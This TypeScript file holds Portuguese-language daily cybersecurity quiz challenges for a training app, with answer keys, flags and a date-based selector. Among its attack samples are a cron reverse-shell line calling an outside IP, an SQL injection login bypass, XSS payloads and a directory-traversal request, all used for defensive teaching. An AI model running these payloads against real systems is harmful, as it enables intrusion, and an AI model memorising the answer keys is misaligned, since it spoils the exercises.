import { DailyChallenge } from '../types';

export const dailyChallengesList: DailyChallenge[] = [
  {
    id: 'daily-jwt-b64',
    title: 'Missão Express: Token Base64 Interceptado',
    category: 'Criptografia',
    difficulty: 'Fácil',
    xpReward: 100,
    description: 'Um token de autorização suspeito foi interceptado em um cabeçalho HTTP de uma requisição para a API administrativa. Decodifique o payload para obter a flag.',
    scenario: 'Durante uma análise de tráfego na rede interna, o Wireshark capturou um cookie de sessão com uma string codificada em Base64.',
    targetDataLabel: 'Payload Base64 Interceptado:',
    targetData: 'RkxBR3tqd3RfaW5zcGVjdGlvbl9iYXNlNjRfMjAyNn0=',
    taskType: 'flag_input',
    flagOrAnswer: 'FLAG{jwt_inspection_base64_2026}',
    acceptableAnswers: [
      'FLAG{jwt_inspection_base64_2026}',
      'jwt_inspection_base64_2026',
      '{jwt_inspection_base64_2026}'
    ],
    hint: 'Em sistemas Unix/Linux você pode usar: echo "STRING" | base64 -d. No JavaScript: atob("STRING").',
    explanation: 'Base64 é um método de codificação de bytes em caracteres ASCII legíveis, NÃO um algoritmo criptográfico. Trafegar dados sensíveis em Base64 sem criptografia permite que qualquer pessoa intercepte e leia os dados instantaneamente.',
    realWorldImpact: 'Muitas aplicações confundem codificação (encoding) com criptografia (encryption), expondo segredos de autenticação em cookies ou query params.'
  },
  {
    id: 'daily-sqli-auth',
    title: 'Missão Express: Bypass de Autenticação via SQLi',
    category: 'Web & OWASP',
    difficulty: 'Médio',
    xpReward: 120,
    description: 'Um formulário de login vulnerável concatena diretamente a entrada do usuário na query SQL: SELECT * FROM usuarios WHERE email = \'INPUT\' AND senha = \'...\'. Qual payload faz a query retornar verdadeiro ignorando a senha?',
    scenario: 'Você está realizando um teste de intrusão autorizado em um portal legado. O desenvolvedor não utilizou Prepared Statements (consultas parametrizadas).',
    targetDataLabel: 'Consulta SQL Vulnerável no Backend:',
    targetData: "SELECT * FROM users WHERE email = '$email' AND password = '$password';",
    taskType: 'multiple_choice',
    flagOrAnswer: "admin' OR '1'='1",
    options: [
      {
        id: 'opt-1',
        text: "<script>alert('admin')</script>",
        isCorrect: false,
        explanation: 'Incorreto. Isso é um payload de Cross-Site Scripting (XSS), que afeta o navegador da vítima, não a consulta ao banco de dados.'
      },
      {
        id: 'opt-2',
        text: "admin' OR '1'='1",
        isCorrect: true,
        explanation: 'Correto! O apóstrofo (\') fecha a string do email e a condição \'1\'=\'1\' sempre avalia como verdadeira para todas as linhas, retornando o primeiro usuário (frequentemente o admin).'
      },
      {
        id: 'opt-3',
        text: "DROP TABLE users;",
        isCorrect: false,
        explanation: 'Incorreto. Em drivers que não suportam múltiplas queries empilhadas (stacked queries), isso causará um erro de sintaxe e não autentica no sistema.'
      },
      {
        id: 'opt-4',
        text: "SELECT * FROM passwords;",
        isCorrect: false,
        explanation: 'Incorreto. O interpretador SQL espera uma expressão booleana dentro da cláusula WHERE, gerando falha de sintaxe.'
      }
    ],
    hint: 'Lembre-se da técnica clássica de fechar as aspas da string e injetar uma condição lógica tautológica (sempre verdadeira).',
    explanation: 'Ao concatenar variáveis diretamente em strings SQL, caracteres de controle como apóstrofos quebram a separação lógica entre comando e dados.',
    realWorldImpact: 'Injeções SQL continuam entre as vulnerabilidades mais perigosas da OWASP Top 10, podendo levar a vazamento total do banco de dados ou execução remota de código.'
  },
  {
    id: 'daily-phishing-url',
    title: 'Missão Express: Radar Anti-Phishing',
    category: 'Engenharia Social',
    difficulty: 'Fácil',
    xpReward: 90,
    description: 'Um colaborador de suporte recebeu um e-mail urgente solicitando redefinição da chave de segurança corporativa. Analise os quatro links abaixo e aponte qual deles é um golpe (Phishing).',
    scenario: 'E-mail recebido com o título: "[URGENTE] Sua conta corporativa expira em 2 horas! Atualize seus dados agora."',
    targetDataLabel: 'Links exibidos na mensagem:',
    targetData: `1. https://login.microsoftonline.com/common/oauth2/authorize
2. https://accounts.google.com/signin/v2/identifier
3. https://login-microsoftonline.com-auth.security-update.cloud/portal/login
4. https://github.com/login`,
    taskType: 'multiple_choice',
    flagOrAnswer: '3',
    options: [
      {
        id: 'opt-1',
        text: 'Link 1 (microsoftonline.com)',
        isCorrect: false,
        explanation: 'Incorreto. Este é o domínio oficial da Microsoft para logon corporativo SSO/OAuth.'
      },
      {
        id: 'opt-2',
        text: 'Link 2 (accounts.google.com)',
        isCorrect: false,
        explanation: 'Incorreto. Este é o domínio legítimo do serviço de contas do Google.'
      },
      {
        id: 'opt-3',
        text: 'Link 3 (login-microsoftonline.com-auth.security-update.cloud)',
        isCorrect: true,
        explanation: 'Excelente olho clínico! O domínio real registrado é "security-update.cloud". Os invasores usam "login-microsoftonline.com-auth" como subdomínio falso para enganar quem lê rapidamente.'
      },
      {
        id: 'opt-4',
        text: 'Link 4 (github.com)',
        isCorrect: false,
        explanation: 'Incorreto. O domínio github.com é o portal oficial legítimo.'
      }
    ],
    hint: 'Lembre-se: em uma URL, o domínio principal fica imediatamente antes do último sufixo (.com, .cloud, .net) antes da primeira barra (/), independente de quantos hífens ou subdomínios existam antes.',
    explanation: 'Golpistas registram domínios genéricos baratos e criam subdomínios com os nomes exatos de bancos ou empresas para ludibriar usuários em celulares ou notificações rápidas.',
    realWorldImpact: 'Mais de 80% dos incidentes de invasão corporativa começam com credenciais roubadas via phishing com técnicas de domínios homóglifos e subdomínios fraudulentos.'
  },
  {
    id: 'daily-rot13-cipher',
    title: 'Missão Express: Mensagem Criptografada em ROT13',
    category: 'Criptografia',
    difficulty: 'Fácil',
    xpReward: 100,
    description: 'Encontramos um arquivo oculto deixado por um grupo cibercriminoso contendo uma flag cifrada pela cifra de César clássica (deslocamento de 13 posições / ROT13). Decodifique a flag.',
    scenario: 'Durante a resposta a incidentes em uma estação de trabalho comprometida, um script em batch continha o texto cifrado abaixo.',
    targetDataLabel: 'Texto Cifrado em ROT13:',
    targetData: 'SYNT{ebg13_pvcure_qrpbqrq_unpx_2026}',
    taskType: 'flag_input',
    flagOrAnswer: 'FLAG{rot13_cipher_decoded_hack_2026}',
    acceptableAnswers: [
      'FLAG{rot13_cipher_decoded_hack_2026}',
      'rot13_cipher_decoded_hack_2026',
      '{rot13_cipher_decoded_hack_2026}'
    ],
    hint: 'Em ROT13, cada letra do alfabeto é substituída pela letra que está 13 posições à frente (A vira N, B vira O, S vira F). Aplicar ROT13 duas vezes restaura o texto original.',
    explanation: 'ROT13 é uma cifra simétrica de substituição muito simples. Ela não oferece segurança real, sendo usada apenas para ofuscação primária de strings em malwares.',
    realWorldImpact: 'Autores de malwares e adwares frequentemente usam ROT13 para ocultar nomes de APIs e comandos da análise estática de antivírus básicos.'
  },
  {
    id: 'daily-log-traversal',
    title: 'Missão Express: Caçada no Log do Servidor (SIEM)',
    category: 'Forense & Logs',
    difficulty: 'Médio',
    xpReward: 110,
    description: 'Analise o trecho de log de requisições HTTP do servidor web e identifique qual linha contém uma tentativa de ataque de Directory Traversal (LFI).',
    scenario: 'O time de SOC recebeu um alerta de volumetria de requisições 404 e 200 no endpoint de download de imagens.',
    targetDataLabel: 'Amostra do access.log do Apache:',
    targetData: `[Linha A] 192.168.1.50 - - [03/Sep/2026:10:14:02] "GET /index.php?page=contato HTTP/1.1" 200 4210
[Linha B] 192.168.1.102 - - [03/Sep/2026:10:14:15] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1845
[Linha C] 192.168.1.88 - - [03/Sep/2026:10:14:23] "POST /api/v1/auth/token HTTP/1.1" 401 54
[Linha D] 192.168.1.15 - - [03/Sep/2026:10:14:31] "GET /static/css/styles.css HTTP/1.1" 304 0`,
    taskType: 'multiple_choice',
    flagOrAnswer: 'Linha B',
    options: [
      {
        id: 'opt-a',
        text: 'Linha A (GET /index.php?page=contato)',
        isCorrect: false,
        explanation: 'Incorreto. Esta é uma navegação comum para uma página de contato legítima.'
      },
      {
        id: 'opt-b',
        text: 'Linha B (GET /download.php?file=../../../../etc/passwd)',
        isCorrect: true,
        explanation: 'Exato! A sequência "../" (dot-dot-slash) é a assinatura clássica de Directory Traversal, tentando escapar da pasta web e ler o arquivo de contas do Linux (/etc/passwd).'
      },
      {
        id: 'opt-c',
        text: 'Linha C (POST /api/v1/auth/token)',
        isCorrect: false,
        explanation: 'Incorreto. Trata-se de uma tentativa de login malsucedida (código 401), não directory traversal.'
      },
      {
        id: 'opt-d',
        text: 'Linha D (GET /static/css/styles.css)',
        isCorrect: false,
        explanation: 'Incorreto. É apenas o carregamento de uma folha de estilos em cache (código 304).'
      }
    ],
    hint: 'Procure por sequências de retrocesso de diretório como "../" que apontam para arquivos sensíveis do sistema operacional como /etc/passwd.',
    explanation: 'Directory Traversal ocorre quando uma aplicação recebe o nome de um arquivo do usuário sem sanitizar sequências de subida de diretório, permitindo ler qualquer arquivo legível pelo usuário do servidor.',
    realWorldImpact: 'Pode permitir que invasores roubem chaves privadas SSH, arquivos de configuração com senhas de banco de dados e segredos da infraestrutura.'
  },
  {
    id: 'daily-hash-md5',
    title: 'Missão Express: Quebra de Hash MD5',
    category: 'Criptografia',
    difficulty: 'Fácil',
    xpReward: 100,
    description: 'Em um dump de credenciais antigas foi encontrada a hash MD5: 5d41402abc4b2a76b9719d911017c592. Qual é a palavra secreta original?',
    scenario: 'Auditoria de segurança em um banco de dados legado revelou que as senhas foram salvas sem Salt com algoritmo MD5 obsoleto.',
    targetDataLabel: 'Hash MD5 Extraída (32 caracteres hex):',
    targetData: '5d41402abc4b2a76b9719d911017c592',
    taskType: 'flag_input',
    flagOrAnswer: 'hello',
    acceptableAnswers: [
      'hello',
      'HELLO',
      'FLAG{hello}',
      'FLAG{hello_cracked_md5}'
    ],
    hint: 'Esta é a hash da saudação mais famosa do mundo da programação ("olá" em inglês, 5 letras).',
    explanation: 'O algoritmo MD5 é uma função de resumo unidirecional de 128 bits. Por ser rápido demais e vulnerável a colisões e rainbow tables, é estritamente proibido para armazenar senhas modernas.',
    realWorldImpact: 'Bancos de dados com senhas em MD5 ou SHA-1 sem salt podem ser quebrados em segundos com placas de vídeo e dicionários de senhas vazadas.'
  },
  {
    id: 'daily-port-service',
    title: 'Missão Express: Varredura de Portas & Superfície de Ataque',
    category: 'Redes & Portas',
    difficulty: 'Fácil',
    xpReward: 90,
    description: 'Um relatório do Nmap listou quatro portas abertas com serviços expostos à internet. Qual porta representa o serviço de Remote Desktop Protocol (RDP) do Windows?',
    scenario: 'Auditoria externa em um endereço IP corporativo detectou as seguintes portas TCP abertas.',
    targetDataLabel: 'Portas detectadas pelo Nmap:',
    targetData: `PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server`,
    taskType: 'multiple_choice',
    flagOrAnswer: '3389',
    options: [
      {
        id: 'opt-22',
        text: 'Porta 22 (SSH)',
        isCorrect: false,
        explanation: 'Incorreto. A porta 22 é o padrão do protocolo Secure Shell (SSH), comum em servidores Linux.'
      },
      {
        id: 'opt-80',
        text: 'Porta 80 (HTTP)',
        isCorrect: false,
        explanation: 'Incorreto. A porta 80 é utilizada para navegação web não criptografada.'
      },
      {
        id: 'opt-443',
        text: 'Porta 443 (HTTPS)',
        isCorrect: false,
        explanation: 'Incorreto. A porta 443 é usada para tráfego web seguro com TLS/SSL.'
      },
      {
        id: 'opt-3389',
        text: 'Porta 3389 (RDP)',
        isCorrect: true,
        explanation: 'Correto! A porta 3389 é a porta padrão do RDP (Remote Desktop Protocol) da Microsoft. Expô-la diretamente para a internet é um vetor crítico de ataques de ransomware e força bruta.'
      }
    ],
    hint: 'A porta padrão do Terminal Services / Área de Trabalho Remota do Windows tem 4 dígitos e começa com 33..',
    explanation: 'A porta 3389 aberta na internet pública é alvo constante de robôs automatizados que disparam ataques de dicionário e exploram vulnerabilidades como BlueKeep.',
    realWorldImpact: 'Invasores usam RDP desprotegido para obter controle gráfico total de estações de trabalho e desativar antivírus da empresa.'
  },
  {
    id: 'daily-dom-xss',
    title: 'Missão Express: Auditoria de Código XSS no Frontend',
    category: 'Web & OWASP',
    difficulty: 'Médio',
    xpReward: 110,
    description: 'Um desenvolvedor escreveu uma função JavaScript que exibe o nome do usuário na tela. Qual das abordagens abaixo é a correta para prevenir Cross-Site Scripting (XSS)?',
    scenario: 'Revisão de código (Code Review) antes de enviar a nova versão do painel para produção.',
    targetDataLabel: 'Código Vulnerável identificado:',
    targetData: `// VULNERÁVEL:
document.getElementById('saudacao').innerHTML = "Olá, " + userName;`,
    taskType: 'multiple_choice',
    flagOrAnswer: 'textContent',
    options: [
      {
        id: 'opt-1',
        text: "document.getElementById('saudacao').textContent = 'Olá, ' + userName;",
        isCorrect: true,
        explanation: 'Perfeito! Usar textContent (ou innerText) força o navegador a tratar a entrada puramente como texto simples, impedindo que tags como <script> ou <img onerror=...> sejam interpretadas como HTML executável.'
      },
      {
        id: 'opt-2',
        text: "document.getElementById('saudacao').innerHTML = userName.replace('<script>', '');",
        isCorrect: false,
        explanation: 'Incorreto. Filtros ingênuos de remoção de tags podem ser facilmente contornados com maiúsculas (<sCrIpt>), tags aninhadas (<scr<script>ipt>) ou eventos (<img src=x onerror=alert(1)>).'
      },
      {
        id: 'opt-3',
        text: "document.getElementById('saudacao').innerHTML = eval(userName);",
        isCorrect: false,
        explanation: 'Perigoso! Usar eval() é uma falha gravíssima que executa diretamente código JavaScript arbitrário.'
      },
      {
        id: 'opt-4',
        text: "document.getElementById('saudacao').outerHTML = '<h1>' + userName + '</h1>';",
        isCorrect: false,
        explanation: 'Incorreto. outerHTML sofre exatamente da mesma vulnerabilidade de injeção de HTML que innerHTML.'
      }
    ],
    hint: 'Qual propriedade do DOM trata o conteúdo exclusivamente como texto puro sem parsear tags HTML?',
    explanation: 'Ao manipular o DOM no JavaScript, o uso de innerHTML com dados vindos de usuários ou APIs não sanitizadas é a causa número 1 de DOM-based XSS.',
    realWorldImpact: 'Com XSS, invasores podem capturar cookies de sessão, redirecionar a vítima para páginas fraudulentas ou realizar ações em nome do usuário logado.'
  },
  {
    id: 'daily-mfa-fatigue',
    title: 'Missão Express: Defesa Contra Ataque de MFA Fatigue',
    category: 'Engenharia Social',
    difficulty: 'Fácil',
    xpReward: 95,
    description: 'Durante a madrugada, um funcionário começou a receber mais de 50 notificações consecutivas no aplicativo autenticador solicitando: "Você está tentando fazer login? [Aprovar] [Negar]". Qual técnica o invasor está utilizando?',
    scenario: 'Incidente de segurança relatado pelo time de suporte às 03:00 da manhã.',
    targetDataLabel: 'Notificação repetitiva na tela do celular:',
    targetData: `Solicitação de login iniciada em São Petersburgo, RU.
Dispositivo: Desconhecido
Tentativa #54
[ APROVAR ]    [ NEGAR ]`,
    taskType: 'multiple_choice',
    flagOrAnswer: 'MFA Fatigue',
    options: [
      {
        id: 'opt-1',
        text: 'Ataque de MFA Fatigue (Bombardeio de Push / Cansaço Psicológico)',
        isCorrect: true,
        explanation: 'Correto! O invasor já possui a senha do usuário e dispara dezenas de solicitações push torcendo para que a vítima aprove por engano ou para silenciar o celular.'
      },
      {
        id: 'opt-2',
        text: 'Ataque Man-in-the-Middle por ARP Spoofing',
        isCorrect: false,
        explanation: 'Incorreto. ARP Spoofing ocorre na camada de enlace dentro da rede local e não gera notificações push no celular.'
      },
      {
        id: 'opt-3',
        text: 'Buffer Overflow no smartphone',
        isCorrect: false,
        explanation: 'Incorreto. Buffer overflow é uma falha de corrupção de memória de baixo nível.'
      },
      {
        id: 'opt-4',
        text: 'Envenenamento de cache DNS',
        isCorrect: false,
        explanation: 'Incorreto. DNS Cache Poisoning altera resolução de nomes, não envia notificações push de login.'
      }
    ],
    hint: 'O ataque baseia-se em cansar a vítima até que ela aperte "Aprovar" para parar o barulho.',
    explanation: 'O MFA Fatigue explora a fraqueza humana na aprovação com um clique. Para mitigar esse ataque, empresas modernas usam "Number Matching" (digitar na tela do celular os 2 números que aparecem no computador).',
    realWorldImpact: 'Grandes corporações (como a Uber em 2022) sofreram intrusões bem-sucedidas através de MFA Fatigue combinado com mensagens no WhatsApp se passando pelo suporte técnico.'
  },
  {
    id: 'daily-malware-extension',
    title: 'Missão Express: Detecção de Anexo Malicioso com Dupla Extensão',
    category: 'Engenharia Social',
    difficulty: 'Fácil',
    xpReward: 90,
    description: 'No Windows, as extensões de arquivos conhecidos vêm ocultas por padrão. Um invasor enviou um arquivo chamado: relatorio_financeiro.pdf.exe. Se o usuário clicar duas vezes, o que acontecerá?',
    scenario: 'Análise de anexo suspeito recebido pela equipe do departamento financeiro.',
    targetDataLabel: 'Arquivo Anexado:',
    targetData: 'Nome exibido no Windows: "relatorio_financeiro.pdf"\nNome real do arquivo: "relatorio_financeiro.pdf.exe"\nÍcone configurado: Ícone do Adobe Acrobat Reader',
    taskType: 'multiple_choice',
    flagOrAnswer: 'executavel',
    options: [
      {
        id: 'opt-1',
        text: 'O Windows executará o arquivo binário (.exe) instalando malware ou ransomware no computador.',
        isCorrect: true,
        explanation: 'Exato! A extensão que define o comportamento do arquivo no Windows é sempre a ÚLTIMA (.exe). O .pdf no meio é apenas um texto falso para enganar o usuário.'
      },
      {
        id: 'opt-2',
        text: 'O Adobe Acrobat abrirá o arquivo como um documento PDF normalmente.',
        isCorrect: false,
        explanation: 'Incorreto. O sistema operacional lê a extensão final (.exe) e executa o binário como programa executável.'
      },
      {
        id: 'opt-3',
        text: 'O Windows impedirá automaticamente a execução porque arquivos não podem ter dois pontos.',
        isCorrect: false,
        explanation: 'Incorreto. O sistema de arquivos suporta múltiplos pontos no nome sem qualquer restrição.'
      }
    ],
    hint: 'Qual extensão comanda a ação do arquivo quando o sistema operacional decide como abri-lo?',
    explanation: 'A técnica de dupla extensão (Right-to-Left Override ou nomes com .pdf.exe) é muito comum em ataques direcionados (spear phishing). Sempre configure o Windows para "Exibir extensões de nomes de arquivos".',
    realWorldImpact: 'Milhares de empresas sofrem bloqueio por ransomware todo mês porque colaboradores executam arquivos .exe disfarçados de notas fiscais em PDF.'
  },
  {
    id: 'daily-cron-shell',
    title: 'Missão Express: Persistência no Linux (Reverse Shell)',
    category: 'Terminal & Linux',
    difficulty: 'Médio',
    xpReward: 120,
    description: 'Durante uma análise pós-intrusão no arquivo crontab (/etc/crontab) do Linux, foi encontrada a linha abaixo. Qual é a finalidade dessa instrução?',
    scenario: 'Investigação forense após um servidor web Linux apresentar tráfego constante de saída na porta 4444.',
    targetDataLabel: 'Entrada suspeita no /etc/crontab:',
    targetData: '* * * * * root bash -i >& /dev/tcp/198.51.100.23/4444 0>&1',
    taskType: 'multiple_choice',
    flagOrAnswer: 'revshell',
    options: [
      {
        id: 'opt-1',
        text: 'Estabelece um Reverse Shell conectando de volta ao IP do atacante a cada minuto com privilégios de root.',
        isCorrect: true,
        explanation: 'Correto! A sintaxe * * * * * roda a cada minuto. O comando redireciona stdin e stdout do bash para um socket TCP (/dev/tcp), dando um terminal interativo com privilégios máximos (root) ao atacante.'
      },
      {
        id: 'opt-2',
        text: 'Cria uma cópia de segurança dos logs para o servidor remoto.',
        isCorrect: false,
        explanation: 'Incorreto. O comando invoca um shell bash interativo conectado a um socket de rede, não uma ferramenta de backup como rsync ou scp.'
      },
      {
        id: 'opt-3',
        text: 'Sincroniza o relógio do sistema via protocolo NTP.',
        isCorrect: false,
        explanation: 'Incorreto. Sincronização de horário usa NTP/Chrony e portas UDP 123.'
      }
    ],
    hint: 'Observe a chamada interativa "bash -i" e o redirecionamento de entrada/saída para um socket de rede TCP.',
    explanation: 'Um Reverse Shell (shell reverso) faz com que a máquina invadida inicie a conexão de saída em direção ao atacante, contornando a maioria dos firewalls estaduais que bloqueiam apenas conexões de entrada.',
    realWorldImpact: 'Mecanismos de persistência em tarefas agendadas (cron no Linux e Task Scheduler no Windows) garantem que o invasor mantenha o acesso mesmo se o servidor for reiniciado.'
  },
  {
    id: 'daily-hidden-robots',
    title: 'Missão Express: Reconhecimento Passivo no robots.txt',
    category: 'Web & OWASP',
    difficulty: 'Fácil',
    xpReward: 95,
    description: 'Analise o arquivo robots.txt coletado de um portal corporativo. Qual diretório sensível foi revelado pelos desenvolvedores na tentativa de esconder de motores de busca?',
    scenario: 'Fase de reconhecimento e enumeração pública de um alvo.',
    targetDataLabel: 'Conteúdo de https://alvo.corp/robots.txt:',
    targetData: `User-agent: *
Disallow: /admin-portal-secreto/
Disallow: /backups/db/
Disallow: /internal/debug.log
Allow: /`,
    taskType: 'flag_input',
    flagOrAnswer: '/admin-portal-secreto/',
    acceptableAnswers: [
      '/admin-portal-secreto/',
      'admin-portal-secreto',
      '/admin-portal-secreto',
      'FLAG{admin-portal-secreto}',
      '/backups/db/',
      '/backups/db',
      'backups/db'
    ],
    hint: 'Digite o nome de uma das rotas administrativas restritas listadas na diretiva Disallow (ex: /admin-portal-secreto/).',
    explanation: 'O arquivo robots.txt é um arquivo público e consultável por qualquer pessoa. Tentar esconder páginas administrativas colocando-as no robots.txt é um exemplo clássico de "Segurança por Obscuridade" — na verdade você está fornecendo um mapa para os invasores.',
    realWorldImpact: 'Pentesters sempre verificam robots.txt logo no início do teste, pois frequentemente encontram URLs de backup desprotegidas ou painéis de homologação esquecidos.'
  }
];

/**
 * Returns the current calendar date string in YYYY-MM-DD format (local time).
 */
export function getTodayDateString(): string {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  return `${year}-${month}-${day}`;
}

/**
 * Returns a deterministic daily challenge for any given date string (YYYY-MM-DD).
 */
export function getDailyChallenge(dateString: string = getTodayDateString()): DailyChallenge {
  let hash = 0;
  for (let i = 0; i < dateString.length; i++) {
    hash = ((hash << 5) - hash) + dateString.charCodeAt(i);
    hash |= 0; // Convert to 32bit integer
  }
  const index = Math.abs(hash) % dailyChallengesList.length;
  return dailyChallengesList[index];
}

/**
 * Calculates remaining time until the next daily reset (midnight local time).
 */
export function getTimeUntilNextDailyChallenge(): { hours: number; minutes: number; seconds: number; formatted: string } {
  const now = new Date();
  const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1, 0, 0, 0);
  const diffMs = tomorrow.getTime() - now.getTime();

  const totalSeconds = Math.max(0, Math.floor(diffMs / 1000));
  const hours = Math.floor(totalSeconds / 3600);
  const minutes = Math.floor((totalSeconds % 3600) / 60);
  const seconds = totalSeconds % 60;

  const formatted = `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
  return { hours, minutes, seconds, formatted };
}
